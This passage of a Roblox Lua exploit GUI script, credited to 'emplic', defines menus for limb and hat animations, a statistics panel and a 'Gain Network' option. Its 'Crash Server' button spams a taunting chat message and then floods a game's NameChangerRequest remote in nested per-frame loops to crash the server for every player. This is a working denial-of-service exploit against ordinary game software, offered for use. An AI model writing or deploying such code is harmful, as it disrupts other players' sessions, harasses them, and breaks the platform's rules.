		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(chr["Right Arm"].Orientation.X + XvalO.Value, chr["Right Arm"].Orientation.Y + YvalO.Value, chr["Right Arm"].Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function RightArm()
local Limb = "Right Arm"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true
local axis = Vector3.new(0,0,0)

local angular = Vector3.new(0,0,0)
ori.Value = 50
num3.Value = 0

Xval.Value = RarmPosX
Yval.Value = RarmPosY
Zval.Value = RarmPosZ

XvalO.Value = RarmOriX
YvalO.Value = RarmOriY
ZvalO.Value = RarmOriZ
local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, b in pairs(chr:GetChildren()) do
    if b.Name == Limb then
	b.CanCollide = false;
	b:BreakJoints();
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.Responsiveness = responsiveness;
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr["HumanoidRootPart"]);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	game["Run Service"].RenderStepped:connect(function()
    	align.Responsiveness = responsiveness;
end)
	end
end


spintog = true

local function spin()
   if spintog == true then
       spintog = false
       XvalO.Value = XvalO.Value +5
       wait()
       spintog = true
    end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
	for _, v in pairs(mov) do
		v.Position = Vector3.new(RarmPosX,RarmPosY,RarmPosZ);
	end
end)

local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, b in pairs(chr:GetChildren()) do
if b.Name == Limb then
    b.Orientation = Vector3.new(chr["HumanoidRootPart"].Orientation.X + RarmOriX, chr["HumanoidRootPart"].Orientation.Y + RarmOriY, chr["HumanoidRootPart"].Orientation.Z + RarmOriZ)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function LeftArm()
local Limb = "Left Arm"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true
local axis = Vector3.new(0,0,0)

local angular = Vector3.new(0,0,0)
ori.Value = 50
num3.Value = 0

Xval.Value = LarmPosX
Yval.Value = LarmPosY
Zval.Value = LarmPosZ

XvalO.Value = LarmOriX
YvalO.Value = LarmOriY
ZvalO.Value = LarmOriZ
local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, b in pairs(chr:GetChildren()) do
    if b.Name == Limb then
	b.CanCollide = false;
	b:BreakJoints();
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.Responsiveness = responsiveness;
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr["HumanoidRootPart"]);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	game["Run Service"].RenderStepped:connect(function()
    	align.Responsiveness = responsiveness;
end)
	end
end


spintog = true

local function spin()
   if spintog == true then
       spintog = false
       XvalO.Value = XvalO.Value +5
       wait()
       spintog = true
    end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
	for _, v in pairs(mov) do
		v.Position = Vector3.new(LarmPosX,LarmPosY,LarmPosZ);
	end
end)

local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, b in pairs(chr:GetChildren()) do
if b.Name == Limb then
    b.Orientation = Vector3.new(chr["HumanoidRootPart"].Orientation.X + LarmOriX, chr["HumanoidRootPart"].Orientation.Y + LarmOriY, chr["HumanoidRootPart"].Orientation.Z + LarmOriZ)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

RightArm()
hat1()
end)

Script_16.Name = "Script"
Script_16.Parent = HatScripts
Script_16.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_16.Position = UDim2.new(1.32692313, 0, 9, 0)
Script_16.Size = UDim2.new(0, 52, 0, 19)
Script_16.Visible = false
Script_16.Font = Enum.Font.SourceSans
Script_16.Text = "Script"
Script_16.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_16.TextSize = 14.000

Script_17.Name = "Script"
Script_17.Parent = HatScripts
Script_17.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_17.Position = UDim2.new(2.63461542, 0, 6.85714245, 0)
Script_17.Size = UDim2.new(0, 52, 0, 19)
Script_17.Visible = false
Script_17.Font = Enum.Font.SourceSans
Script_17.Text = "Script"
Script_17.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_17.TextSize = 14.000

Script_18.Name = "Script"
Script_18.Parent = HatScripts
Script_18.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_18.Position = UDim2.new(-1.25, 0, 6.85714245, 0)
Script_18.Size = UDim2.new(0, 52, 0, 19)
Script_18.Visible = false
Script_18.Font = Enum.Font.SourceSans
Script_18.Text = "Script"
Script_18.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_18.TextSize = 14.000

Script_19.Name = "Script"
Script_19.Parent = HatScripts
Script_19.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_19.Position = UDim2.new(1.32692313, 0, 6.85714245, 0)
Script_19.Size = UDim2.new(0, 52, 0, 19)
Script_19.Visible = false
Script_19.Font = Enum.Font.SourceSans
Script_19.Text = "Script"
Script_19.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_19.TextSize = 14.000

Script_20.Name = "Script"
Script_20.Parent = HatScripts
Script_20.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_20.Position = UDim2.new(0, 0, 6.85714245, 0)
Script_20.Size = UDim2.new(0, 52, 0, 19)
Script_20.Visible = false
Script_20.Font = Enum.Font.SourceSans
Script_20.Text = "Script"
Script_20.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_20.TextSize = 14.000

Script_21.Name = "Script"
Script_21.Parent = HatScripts
Script_21.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_21.Position = UDim2.new(-1.25, 0, 4.85714245, 0)
Script_21.Size = UDim2.new(0, 52, 0, 19)
Script_21.Visible = false
Script_21.Font = Enum.Font.SourceSans
Script_21.Text = "Script"
Script_21.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_21.TextSize = 14.000

Script_22.Name = "Script"
Script_22.Parent = HatScripts
Script_22.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_22.Position = UDim2.new(0, 0, 4.85714245, 0)
Script_22.Size = UDim2.new(0, 52, 0, 19)
Script_22.Visible = false
Script_22.Font = Enum.Font.SourceSans
Script_22.Text = "Script"
Script_22.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_22.TextSize = 14.000

Script_23.Name = "Script"
Script_23.Parent = HatScripts
Script_23.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_23.Position = UDim2.new(1.32692313, 0, 4.85714245, 0)
Script_23.Size = UDim2.new(0, 52, 0, 19)
Script_23.Visible = false
Script_23.Font = Enum.Font.SourceSans
Script_23.Text = "Script"
Script_23.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_23.TextSize = 14.000

Script_24.Name = "Script"
Script_24.Parent = HatScripts
Script_24.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_24.Position = UDim2.new(2.63461542, 0, 4.85714245, 0)
Script_24.Size = UDim2.new(0, 52, 0, 19)
Script_24.Visible = false
Script_24.Font = Enum.Font.SourceSans
Script_24.Text = "Script"
Script_24.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_24.TextSize = 14.000

Script_25.Name = "Script"
Script_25.Parent = HatScripts
Script_25.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_25.Position = UDim2.new(2.63461542, 0, 2.64285707, 0)
Script_25.Size = UDim2.new(0, 52, 0, 19)
Script_25.Visible = false
Script_25.Font = Enum.Font.SourceSans
Script_25.Text = "Script"
Script_25.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_25.TextSize = 14.000

Script_26.Name = "Script"
Script_26.Parent = HatScripts
Script_26.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_26.Position = UDim2.new(1.32692313, 0, 2.64285707, 0)
Script_26.Size = UDim2.new(0, 52, 0, 19)
Script_26.Visible = false
Script_26.Font = Enum.Font.SourceSans
Script_26.Text = "Script"
Script_26.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_26.TextSize = 14.000

Script_27.Name = "Script"
Script_27.Parent = HatScripts
Script_27.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_27.Position = UDim2.new(0, 0, 2.64285707, 0)
Script_27.Size = UDim2.new(0, 52, 0, 19)
Script_27.Visible = false
Script_27.Font = Enum.Font.SourceSans
Script_27.Text = "Script"
Script_27.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_27.TextSize = 14.000

Script_28.Name = "Script"
Script_28.Parent = HatScripts
Script_28.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_28.Position = UDim2.new(-1.25, 0, 2.64285707, 0)
Script_28.Size = UDim2.new(0, 52, 0, 19)
Script_28.Visible = false
Script_28.Font = Enum.Font.SourceSans
Script_28.Text = "Script"
Script_28.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_28.TextSize = 14.000

Stats.Name = "Stats"
Stats.Parent = Bar
Stats.BackgroundColor3 = Color3.fromRGB(77, 109, 157)
Stats.BackgroundTransparency = 0.600
Stats.BorderSizePixel = 0
Stats.Position = UDim2.new(0.821305811, 0, -1.16666663, 0)
Stats.Size = UDim2.new(0, 52, 0, 14)
Stats.Font = Enum.Font.SourceSans
Stats.Text = "Statistics"
Stats.TextColor3 = Color3.fromRGB(0, 0, 0)
Stats.TextSize = 14.000
Stats.MouseButton1Click:connect(function()
    closeAll()
    openStats()
    selectStats()
end)

PlrCount.Name = "PlrCount"
PlrCount.Parent = Stats
PlrCount.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PlrCount.BackgroundTransparency = 0.900
PlrCount.BorderSizePixel = 0
PlrCount.Position = UDim2.new(-4.59615374, 0, 2.5, 0)
PlrCount.Size = UDim2.new(0, 117, 0, 29)
PlrCount.Font = Enum.Font.SourceSans
PlrCount.Text = "Player Count:"
PlrCount.TextColor3 = Color3.fromRGB(0, 0, 0)
PlrCount.TextScaled = true
PlrCount.TextSize = 14.000
PlrCount.TextWrapped = true

Plrs.Name = "Plrs"
Plrs.Parent = PlrCount
Plrs.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Plrs.BackgroundTransparency = 1.000
Plrs.BorderSizePixel = 0
Plrs.Position = UDim2.new(1.07692313, 0, 0, 0)
Plrs.Size = UDim2.new(0, 49, 0, 29)
Plrs.Font = Enum.Font.SourceSans
Plrs.Text = "loading.."
Plrs.TextColor3 = Color3.fromRGB(0, 0, 0)
Plrs.TextScaled = true
Plrs.TextSize = 14.000
Plrs.TextWrapped = true

MouseTarget.Name = "MouseTarget"
MouseTarget.Parent = Stats
MouseTarget.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MouseTarget.BackgroundTransparency = 0.900
MouseTarget.BorderSizePixel = 0
MouseTarget.Position = UDim2.new(-4.59615374, 0, 5.21428585, 0)
MouseTarget.Size = UDim2.new(0, 117, 0, 29)
MouseTarget.Font = Enum.Font.SourceSans
MouseTarget.Text = "Mouse Target Name:"
MouseTarget.TextColor3 = Color3.fromRGB(0, 0, 0)
MouseTarget.TextScaled = true
MouseTarget.TextSize = 14.000
MouseTarget.TextWrapped = true

TargetName.Name = "TargetName"
TargetName.Parent = MouseTarget
TargetName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TargetName.BackgroundTransparency = 1.000
TargetName.BorderSizePixel = 0
TargetName.Position = UDim2.new(1.07692313, 0, 0, 0)
TargetName.Size = UDim2.new(0, 49, 0, 29)
TargetName.Font = Enum.Font.SourceSans
TargetName.Text = "loading.."
TargetName.TextColor3 = Color3.fromRGB(0, 0, 0)
TargetName.TextScaled = true
TargetName.TextSize = 14.000
TargetName.TextWrapped = true

NetworkStatus.Name = "NetworkStatus"
NetworkStatus.Parent = Stats
NetworkStatus.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
NetworkStatus.BackgroundTransparency = 0.900
NetworkStatus.BorderSizePixel = 0
NetworkStatus.Position = UDim2.new(-4.59615374, 0, 7.9285717, 0)
NetworkStatus.Size = UDim2.new(0, 117, 0, 29)
NetworkStatus.Font = Enum.Font.SourceSans
NetworkStatus.Text = "Network Status:"
NetworkStatus.TextColor3 = Color3.fromRGB(0, 0, 0)
NetworkStatus.TextScaled = true
NetworkStatus.TextSize = 14.000
NetworkStatus.TextWrapped = true

NetworkStatus_2.Name = "NetworkStatus"
NetworkStatus_2.Parent = NetworkStatus
NetworkStatus_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
NetworkStatus_2.BackgroundTransparency = 1.000
NetworkStatus_2.BorderSizePixel = 0
NetworkStatus_2.Position = UDim2.new(1.07692313, 0, 0, 0)
NetworkStatus_2.Size = UDim2.new(0, 49, 0, 29)
NetworkStatus_2.Font = Enum.Font.SourceSans
NetworkStatus_2.Text = "loading.."
NetworkStatus_2.TextColor3 = Color3.fromRGB(0, 0, 0)
NetworkStatus_2.TextScaled = true
NetworkStatus_2.TextSize = 14.000
NetworkStatus_2.TextWrapped = true

PrintOtherExploiters.Name = "PrintOtherExploiters"
PrintOtherExploiters.Parent = Stats
PrintOtherExploiters.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PrintOtherExploiters.Position = UDim2.new(-4.59615374, 0, 10.9285717, 0)
PrintOtherExploiters.Size = UDim2.new(0, 200, 0, 50)
PrintOtherExploiters.Font = Enum.Font.SourceSans
PrintOtherExploiters.Text = "Gain Network"
PrintOtherExploiters.TextColor3 = Color3.fromRGB(0, 0, 0)
PrintOtherExploiters.TextScaled = true
PrintOtherExploiters.TextSize = 14.000
PrintOtherExploiters.TextWrapped = true
PrintOtherExploiters.MouseButton1Click:connect(function()
game:GetService("RunService").RenderStepped:Connect(function()

end)
end)

game['Run Service'].RenderStepped:Connect(function()
local playerValue = Instance.new("NumberValue")
Players = game:GetService("Players")
for i, player in pairs(Players:GetPlayers()) do
	if player:IsA("Player") then
		playerValue.Value = playerValue.Value +1
	end
end
Plrs.Text = playerValue.Value
TargetName.Text = game.Players.LocalPlayer:GetMouse().Target.Name
if game.Players.LocalPlayer.MaximumSimulationRadius >= 10000 then
    NetworkStatus_2.Text = "true"
    else
    NetworkStatus_2.Text = "false"
end
end)

Menu.Name = "Menu"
Menu.Parent = Bar
Menu.BackgroundColor3 = Color3.fromRGB(77, 109, 157)
Menu.BackgroundTransparency = 0.600
Menu.BorderSizePixel = 0
Menu.Position = UDim2.new(0, 0, -1.16666663, 0)
Menu.Size = UDim2.new(0, 52, 0, 14)
Menu.Font = Enum.Font.SourceSans
Menu.Text = "Menu"
Menu.TextColor3 = Color3.fromRGB(0, 0, 0)
Menu.TextSize = 14.000
Menu.MouseButton1Click:connect(function()
    closeAll()
    openMenu()
    selectMenu()
end)

RHS.Name = "RHS"
RHS.Parent = Menu
RHS.BackgroundColor3 = Color3.fromRGB(255, 234, 0)
RHS.Position = UDim2.new(0, 0, 2.57142854, 0)
RHS.Size = UDim2.new(0, 160, 0, 30)
RHS.Visible = false
RHS.Font = Enum.Font.SourceSans
RHS.Text = "Emplic's Gui"
RHS.TextColor3 = Color3.fromRGB(0, 0, 0)
RHS.TextScaled = true
RHS.TextSize = 14.000
RHS.TextWrapped = true

Player.Name = "Player"
Player.Parent = Menu
Player.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Player.Position = UDim2.new(3.23076916, 0, 2.57142854, 0)
Player.Size = UDim2.new(0, 136, 0, 137)
Player.Visible = false
Player.Image = game.Players:GetUserThumbnailAsync(game.Players.LocalPlayer.UserId,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size420x420)

PlayerName.Name = "PlayerName"
PlayerName.Parent = Menu
PlayerName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PlayerName.BackgroundTransparency = 1.000
PlayerName.Position = UDim2.new(3.23076916, 0, 12.3571424, 0)
PlayerName.Size = UDim2.new(0, 136, 0, 36)
PlayerName.Visible = false
PlayerName.Font = Enum.Font.SourceSans
PlayerName.Text = game.Players.LocalPlayer.Name
PlayerName.TextColor3 = Color3.fromRGB(0, 0, 0)
PlayerName.TextScaled = true
PlayerName.TextSize = 14.000
PlayerName.TextWrapped = true

Thank.Name = "Thank"
Thank.Parent = Menu
Thank.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Thank.BackgroundTransparency = 1.000
Thank.Position = UDim2.new(0, 0, 8.78571415, 0)
Thank.Size = UDim2.new(0, 160, 0, 50)
Thank.Visible = false
Thank.Font = Enum.Font.SourceSans
Thank.Text = "made by emplic on roblox hope u enjoy:)"
Thank.TextColor3 = Color3.fromRGB(0, 0, 0)
Thank.TextScaled = true
Thank.TextSize = 14.000
Thank.TextWrapped = true

Scripts.Name = "Scripts"
Scripts.Parent = Bar
Scripts.BackgroundColor3 = Color3.fromRGB(77, 109, 157)
Scripts.BackgroundTransparency = 0.600
Scripts.BorderSizePixel = 0
Scripts.Position = UDim2.new(0.463917524, 0, -1.16666663, 0)
Scripts.Size = UDim2.new(0, 52, 0, 14)
Scripts.Font = Enum.Font.SourceSans
Scripts.Text = "Scripts"
Scripts.TextColor3 = Color3.fromRGB(0, 0, 0)
Scripts.TextSize = 14.000
Scripts.MouseButton1Click:connect(function()
    closeAll()
    openScripts()
    selectScripts()
end)

Script_29.Name = "Script"
Script_29.Parent = Scripts
Script_29.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_29.Position = UDim2.new(-2.59615374, 0, 15, 0)
Script_29.Size = UDim2.new(0, 52, 0, 19)
Script_29.Visible = false
Script_29.Font = Enum.Font.SourceSans
Script_29.Text = "arm spin"
Script_29.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_29.TextSize = 14.000
Script_29.MouseButton1Click:connect(function()

-- Main Animation
-- Hat Position
local function RightArm()
local Limb = "Right Arm"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 2
Yval.Value = .5
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 90

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, b in pairs(chr:GetChildren()) do
    if b.Name == Limb then
	b.CanCollide = false;
	b:BreakJoints();
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Torso);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


spintog = true

local function spin()
   if spintog == true then
       spintog = false
       XvalO.Value = XvalO.Value +5
       wait()
       spintog = true
    end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)

local function orie()
game['Run Service'].RenderStepped:Connect(function()
spin()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, b in pairs(chr:GetChildren()) do
if b.Name == Limb then
    b.Orientation = Vector3.new(plr.Character.Torso.Orientation.X + XvalO.Value, plr.Character.Torso.Orientation.Y + YvalO.Value, plr.Character.Torso.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

-- Main Animation
-- Hat Position
local function LeftArm()
local Limb = "Left Arm"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -2
Yval.Value = .5
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = -90

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, b in pairs(chr:GetChildren()) do
    if b.Name == Limb then
	b.CanCollide = false;
	b:BreakJoints();
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Torso);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

spintog = true

local function spine()
   if spintog == true then
       spintog = false
       XvalO.Value = XvalO.Value -5
       spintog = true
    end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)

local function orie()
game['Run Service'].RenderStepped:Connect(function()
spine()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, b in pairs(chr:GetChildren()) do
if b.Name == Limb then
    b.Orientation = Vector3.new(plr.Character.Torso.Orientation.X + XvalO.Value, plr.Character.Torso.Orientation.Y + YvalO.Value, plr.Character.Torso.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

RightArm()
LeftArm()
end)

Script_30.Name = "Script"
Script_30.Parent = Scripts
Script_30.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Script_30.Position = UDim2.new(1.28846157, 0, 15, 0)
Script_30.Size = UDim2.new(0, 52, 0, 19)
Script_30.Visible = false
Script_30.Font = Enum.Font.SourceSans
Script_30.Text = "Crash Server"
Script_30.TextScaled = true
Script_30.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_30.TextSize = 14.000
Script_30.MouseButton1Click:connect(function()
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SERVER CRASHED BY EMPLIC HAHA LOSERS:)",
"All")

game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SERVER CRASHED BY EMPLIC HAHA LOSERS:)",
"All")
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SERVER CRASHED BY EMPLIC HAHA LOSERS:)",
"All")
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SERVER CRASHED BY EMPLIC HAHA LOSERS:)",
"All")
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SERVER CRASHED BY EMPLIC HAHA LOSERS:)",
"All")
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SERVER CRASHED BY EMPLIC HAHA LOSERS:)",
"All")
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SERVER CRASHED BY EMPLIC HAHA LOSERS:)",
"All")

local plr = game.Players.LocalPlayer.Character
plr.Head.face:Destroy()
plr.Head.Mesh:Destroy()
game.ReplicatedStorage.RemoteFunctions.NameChangerRequest:InvokeServer("e", "eee")
wait(2)
local function die()
game:GetService('RunService').Stepped:Connect(function()
    game.ReplicatedStorage.RemoteFunctions.NameChangerRequest:InvokeServer("e", "eee")
    game.ReplicatedStorage.RemoteFunctions.NameChangerRequest:InvokeServer("e", "eee")
        game.ReplicatedStorage.RemoteFunctions.NameChangerRequest:InvokeServer("e", "eee")
    game.ReplicatedStorage.RemoteFunctions.NameChangerRequest:InvokeServer("e", "eee")
        game.ReplicatedStorage.RemoteFunctions.NameChangerRequest:InvokeServer("e", "eee")
    game.ReplicatedStorage.RemoteFunctions.NameChangerRequest:InvokeServer("e", "eee")
end)
end
game:GetService('RunService').Stepped:Connect(function()
die()
die()
die()
die()
die()
die()
end)
end)

Script_31.Name = "Script"
Script_31.Parent = Scripts
Script_31.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_31.Position = UDim2.new(-0.0192307234, 0, 15, 0)
Script_31.Size = UDim2.new(0, 52, 0, 19)
Script_31.Visible = false
Script_31.Font = Enum.Font.SourceSans
Script_31.TextScaled = true
Script_31.Text = "Enchance Graphics"
Script_31.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_31.TextSize = 14.000
Script_31.MouseButton1Click:connect(function()
    -- Roblox Graphics Enhancher
local light = game.Lighting
for i, v in pairs(light:GetChildren()) do
	v:Destroy()
end

local ter = workspace.Terrain
local color = Instance.new("ColorCorrectionEffect")
local bloom = Instance.new("BloomEffect")
local sun = Instance.new("SunRaysEffect")
local blur = Instance.new("BlurEffect")

color.Parent = light
bloom.Parent = light
sun.Parent = light
blur.Parent = light

-- enable or disable shit

local config = {

	Terrain = true;
	ColorCorrection = true;
	Sun = true;
	Lighting = true;
	BloomEffect = true;
	
}

-- settings {

color.Enabled = false
color.Contrast = 0.15
color.Brightness = 0.1
color.Saturation = 0.25
color.TintColor = Color3.fromRGB(255, 222, 211)

bloom.Enabled = false
bloom.Intensity = 0.1

sun.Enabled = false
sun.Intensity = 0.2
sun.Spread = 1

bloom.Enabled = false
bloom.Intensity = 0.05
bloom.Size = 32
bloom.Threshold = 1

blur.Enabled = false
blur.Size = 6

-- settings }


if config.ColorCorrection then
	color.Enabled = true
end


if config.Sun then
	sun.Enabled = true
end


if config.Terrain then
	-- settings {
	ter.WaterColor = Color3.fromRGB(10, 10, 24)
	ter.WaterWaveSize = 0.1
	ter.WaterWaveSpeed = 22
	ter.WaterTransparency = 0.9
	ter.WaterReflectance = 0.05
	-- settings }
end


if config.Lighting then
	-- settings {
	light.Ambient = Color3.fromRGB(0, 0, 0)
	light.Brightness = 4
	light.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
	light.ColorShift_Top = Color3.fromRGB(0, 0, 0)
	light.ExposureCompensation = 0
	light.FogColor = Color3.fromRGB(132, 132, 132)
	light.GlobalShadows = true
	light.OutdoorAmbient = Color3.fromRGB(112, 117, 128)
	light.Outlines = false
	-- settings }
end

end)

Script_32.Name = "Script"
Script_32.Parent = Scripts
Script_32.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_32.Position = UDim2.new(-1.34615386, 0, 15, 0)
Script_32.Size = UDim2.new(0, 52, 0, 19)
Script_32.Visible = false
Script_32.Font = Enum.Font.SourceSans
Script_32.Text = "Script"
Script_32.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_32.TextSize = 14.000

Script_33.Name = "Script"
Script_33.Parent = Scripts
Script_33.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_33.Position = UDim2.new(-2.59615374, 0, 13, 0)
Script_33.Size = UDim2.new(0, 52, 0, 19)
Script_33.Visible = false
Script_33.Font = Enum.Font.SourceSans
Script_33.Text = "Script"
Script_33.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_33.TextSize = 14.000

Script_34.Name = "Script"
Script_34.Parent = Scripts
Script_34.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_34.Position = UDim2.new(1.28846157, 0, 13, 0)
Script_34.Size = UDim2.new(0, 52, 0, 19)
Script_34.Visible = false
Script_34.Font = Enum.Font.SourceSans
Script_34.Text = "Script"
Script_34.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_34.TextSize = 14.000

Script_35.Name = "Script"
Script_35.Parent = Scripts
Script_35.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_35.Position = UDim2.new(-1.34615386, 0, 13, 0)
Script_35.Size = UDim2.new(0, 52, 0, 19)
Script_35.Visible = false
Script_35.Font = Enum.Font.SourceSans
Script_35.Text = "Script"
Script_35.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_35.TextSize = 14.000

Script_36.Name = "Script"
Script_36.Parent = Scripts
Script_36.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_36.Position = UDim2.new(-0.0192307234, 0, 13, 0)
Script_36.Size = UDim2.new(0, 52, 0, 19)
Script_36.Visible = false
